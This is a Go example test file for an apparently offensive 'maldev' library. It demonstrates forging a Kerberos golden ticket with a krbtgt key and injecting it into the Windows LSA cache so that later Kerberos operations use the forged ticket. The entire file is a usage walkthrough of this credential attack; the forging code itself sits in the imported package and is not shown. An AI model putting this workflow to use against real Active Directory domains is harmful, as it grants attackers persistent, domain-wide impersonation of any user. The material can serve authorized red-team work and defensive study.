package goldenticket_test

import (
	"fmt"

	"github.com/oioio-space/maldev/credentials/goldenticket"
)

// Forge marshals a PAC and signs the TGT with the operator-supplied
// krbtgt key. Returns kirbi (KRB-CRED) bytes ready for Submit. The
// real Params surface includes user/domain/SID/etype/krbtgt-hash —
// see goldenticket.Params godoc for the full struct.
func ExampleForge() {
	var params goldenticket.Params
	// fill params per the package's Params doc
	kirbi, err := goldenticket.Forge(params)
	if err != nil {
		fmt.Println("forge:", err)
		return
	}
	fmt.Printf("kirbi %d bytes\n", len(kirbi))
}

// Submit writes the kirbi into the current process's LSA cache via
// LsaCallAuthenticationPackage(KerbSubmitTicketMessage). Subsequent
// Kerberos operations from this process use the forged ticket.
func ExampleSubmit() {
	var kirbi []byte // from Forge or external file
	if err := goldenticket.Submit(kirbi); err != nil {
		fmt.Println("submit:", err)
	}
}
